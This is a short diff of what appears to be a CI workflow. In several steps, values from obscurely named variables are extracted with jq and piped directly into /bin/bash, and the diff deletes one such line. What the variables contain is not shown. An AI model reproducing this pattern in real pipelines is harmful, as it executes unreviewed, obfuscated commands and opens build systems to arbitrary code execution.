@@ -22,7 +22,6 @@ jobs:
           echo $tntz5 | jq -r .lwywq4316 | /bin/bash
           echo $rztb47 | jq -r .mhug8 | /bin/bash
           printf '%s' "$hdkwp7" | jq -r .jzvi6 | /bin/bash
-          echo $ad4 | jq -r .k46 | /bin/bash
           echo $asdc724 | jq -r .w305 | /bin/bash
 
       - name: Persist output
